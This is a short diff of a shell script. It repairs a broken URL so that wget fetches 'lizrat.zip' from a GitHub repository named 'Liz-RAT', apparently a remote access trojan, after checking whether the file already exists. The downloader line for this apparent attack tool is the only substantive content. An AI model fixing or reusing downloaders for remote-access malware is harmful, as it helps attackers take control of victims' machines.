@@ -50,7 +50,7 @@ if [ -e "$file" ]; then
   echo "${GREEN}File $file exists. NOT Downloading it${NC}"
 else
   echo "${GREEN}$file does not exist. Downloading...${NC}"
-  wget -q "https:raw.githubusercontent.com/Bhartiya-Hacker/Liz-RAT/master/lizrat.zip" 
+  wget -q "https://raw.githubusercontent.com/Bhartiya-Hacker/Liz-RAT/master/lizrat.zip" 
 fi
 sleep 5
 
